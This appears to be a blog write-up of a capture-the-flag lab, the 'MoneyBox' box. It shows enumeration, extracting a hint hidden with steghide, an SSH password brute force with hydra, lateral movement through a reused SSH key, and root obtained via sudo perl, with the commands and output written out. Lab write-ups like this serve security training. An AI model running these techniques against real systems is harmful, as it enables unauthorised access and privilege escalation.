---
layout: post
author: H4
---

[Details](https://www.vulnhub.com/entry/moneybox-1,653/)  
This box was customized by Offensive Security and integrated in the 'proving grounds' lab.  
In the following you see the solution of the 'proving grounds' version.  

# discovery

We start with a simple `nmap` scan to identify the attack surface of the target.

## port scan
```bash
$ nmap -Pn 192.168.89.230
Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-13 15:48 EST
Nmap scan report for 192.168.89.230
Host is up (0.029s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 13.59 seconds
```

## port 21 (`ftp`)
Testing for anonymous access.
```bash
$ ftp 192.168.89.230  
Connected to 192.168.89.230.
220 (vsFTPd 3.0.3)
Name (192.168.89.230:void): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0         1093656 Feb 26  2021 trytofind.jpg
226 Directory send OK.
```

> Anonymous access is allowed.
{: .prompt-info }

Lets download the file `trytofind.jpg`
```
ftp> get trytofind.jpg
local: trytofind.jpg remote: trytofind.jpg
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for trytofind.jpg (1093656 bytes).
226 Transfer complete.
1093656 bytes received in 0.42 secs (2.5011 MB/s)
ftp>
```

## port 80 (web server)
We are starting with some dir busting.
```bash
$ gobuster dir -u http://192.168.89.230/ -w /usr/share/wordlists/dirb/common.txt -t 5 -x php,txt,html -b 404,403     
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.89.230/
[+] Method:                  GET
[+] Threads:                 5
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   403,404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php,txt,html
[+] Timeout:                 10s
===============================================================
2022/11/13 15:56:36 Starting gobuster in directory enumeration mode
===============================================================
/blogs                (Status: 301) [Size: 316] [--> http://192.168.89.230/blogs/]
/index.html           (Status: 200) [Size: 621]                                   
/index.html           (Status: 200) [Size: 621]                                   
                                                                                  
===============================================================
2022/11/13 15:58:19 Finished
===============================================================
```

The resource `/blog` looks interesting. Lets have a look.
### `http` request
```http
GET /blogs/ HTTP/1.1
Host: 192.168.89.230
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
```

### `http` response
```http
HTTP/1.1 200 OK
Date: Sun, 13 Nov 2022 20:57:49 GMT
Server: Apache/2.4.38 (Debian)
Last-Modified: Fri, 26 Feb 2021 16:14:58 GMT
ETag: "161-5bc3f91c5aad7-gzip"
Accept-Ranges: bytes
Vary: Accept-Encoding
Content-Length: 353
Connection: close
Content-Type: text/html

<html>
<head><title>MoneyBox</title></head>
<body>
    <h1>I'm T0m-H4ck3r</h1><br>
        <p>I Already Hacked This Box and Informed.But They didn't Do any Security configuration</p>
        <p>If You Want Hint For Next Step......?<p>
</body>
</html>




<!--the hint is the another secret directory is S3cr3t-T3xt-->
```

So, we continue with requesting the resource `/S3cr3t-T3xt`.

###  `http` request
```http
GET /S3cr3t-T3xt/ HTTP/1.1
Host: 192.168.89.230
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
```

### `http` response
```http
HTTP/1.1 200 OK
Date: Sun, 13 Nov 2022 20:58:12 GMT
Server: Apache/2.4.38 (Debian)
Last-Modified: Fri, 26 Feb 2021 16:19:07 GMT
ETag: "c3-5bc3fa09faee4-gzip"
Accept-Ranges: bytes
Vary: Accept-Encoding
Content-Length: 195
Connection: close
Content-Type: text/html

<html>
<head><title>MoneyBox</title></head>
<body>
    <h1>There is Nothing In this Page.........</h1>
</body>
</html>





<!..Secret Key 3xtr4ctd4t4 >

```

> We got a 'secret' key with the value `3xtr4ctd4t4`.
{: .prompt-info }

## combining things
From the `ftp` service we got a file named `trytofind.jpg` which indicates that maybe some kind of steganography is used here.  
Additionally we know a secret key with the value `3xtr4ctd4t4`.   
  
If you research a bit you soon will see a tool named `steghide` which uses a secret key to hide information in pictures. Let us try to extract information from the picture `trytofind.jpg` with the secret key `3xtr4ctd4t4`.

```bash
$ steghide extract -sf trytofind.jpg                                                                                                                                                                                                  1 ⨯
Enter passphrase: 
wrote extracted data to "data.txt".
```

It worked! Lets have a look what data was extracted.
```bash
$ cat data.txt  
Hello.....  renu

      I tell you something Important.Your Password is too Week So Change Your Password
Don't Underestimate it.......
```

---

# exploitation
## `ssh` brute force
Now we know that the admin has the name `renu` and that he uses a weak password. Lets try to brute force his `ssh` account with `hydra`.
```bash
$ hydra -V -l renu -P /usr/share/seclists/Passwords/xato-net-10-million-passwords-100.txt 192.168.89.230 ssh                                                                                                                        130 ⨯
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-11-13 16:02:51
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 100 login tries (l:1/p:100), ~7 tries per task
[DATA] attacking ssh://192.168.89.230:22/
[ATTEMPT] target 192.168.89.230 - login "renu" - pass "123456" - 1 of 100 [child 0] (0/0)
[ATTEMPT] target 192.168.89.230 - login "renu" - pass "password" - 2 of 100 [child 1] (0/0)
[ATTEMPT] target 192.168.89.230 - login "renu" - pass "12345678" - 3 of 100 [child 2] (0/0)
[ATTEMPT] target 192.168.89.230 - login "renu" - pass "qwerty" - 4 of 100 [child 3] (0/0)
...
[ATTEMPT] target 192.168.89.230 - login "renu" - pass "yankees" - 95 of 101 [child 4] (0/1)
[ATTEMPT] target 192.168.89.230 - login "renu" - pass "987654321" - 96 of 101 [child 7] (0/1)
[22][ssh] host: 192.168.89.230   login: renu   password: 987654321
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 1 final worker threads did not complete until end.
[ERROR] 1 target did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-11-13 16:03:42
```

> Yes! We got his `ssh` credentials: `renu:987654321`
{: .prompt-info }

## `ssh` login
```bash
$ ssh renu@192.168.89.230                                                                                                                                                                                                           255 ⨯
renu@192.168.89.230's password: 
Linux MoneyBox 4.19.0-22-amd64 #1 SMP Debian 4.19.260-1 (2022-09-29) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Fri Sep 23 10:00:13 2022
renu@MoneyBox:~$ whoami
renu
```

> We got a shell!
{: .prompt-info }

---

# post exploitation
## get first flag
```bash
renu@MoneyBox:~$ ls
ftp  local.txt
renu@MoneyBox:~$ cat local.txt 
5******************************8
```

## privilege escalation

We start with checking if we are allowed to execute commands as a super user.
```bash
$ sudo -l
[sudo] password for renu: 
Sorry, user renu may not run sudo on MoneyBox.
```

> Unfortunately we are not allowed to.  
{: .prompt-danger }
  
Now lets review the `.bash_history` of user `renu`.  
Inside the history file we spot the following interesting lines.
```bash
renu@MoneyBox:~$ cat .bash_history 
...
cd /home
ls
cd lily
ls
ls -la
clear
cd
clear
ssh-keygen -t rsa
clear
cd .ssh
ls
ssh-copy-id lily@192.168.43.80
clear
cd
cd -
ls -l
chmod 400 id_rsa
ls -l
ssh -i id_rsa lily@192.168.43.80
clear
ssh -i id_rsa lily@192.168.43.80
cd
clear
cd .ssh/
ls
ssh -i id_rsa lily@192.168.43.80
...
```

It seems that user `renu` has a `ssh` private key in his `.ssh` folder which allows him to connect as user `lily` to the server. Lets verifiy this.
```bash
renu@MoneyBox:~$ cd
renu@MoneyBox:~$ cd .ssh/
renu@MoneyBox:~/.ssh$ ls
id_rsa  id_rsa.pub  known_hosts
renu@MoneyBox:~/.ssh$ ssh -i id_rsa lily@127.0.0.1
Linux MoneyBox 4.19.0-22-amd64 #1 SMP Debian 4.19.260-1 (2022-09-29) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Nov 13 13:23:58 2022 from 127.0.0.1
lily@MoneyBox:~$
```

> And it worked! We are now user `lily`.
{: .prompt-info }
  
Lets check if we are allowed to execute commands as a super user.
```bash
lily@MoneyBox:~$ sudo -l
Matching Defaults entries for lily on MoneyBox:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User lily may run the following commands on MoneyBox:
    (ALL : ALL) NOPASSWD: /usr/bin/perl
```

> Yes! We are allowed to execute `/usr/bin/perl` as a super user.  
> Checking [`gtfobins`](https://gtfobins.github.io/gtfobins/perl/#sudo) on how to exploit this to get `root` access.
{: .prompt-info }

```bash
 sudo perl -e 'exec "/bin/sh";'
# whoami
root
```

> There we go! We are `root` now.
{: .prompt-info }

## get second flag
```bash
# cd /root      
# ls
proof.txt
# cat proof.txt
4******************************4
```

Pwned! <@:-)
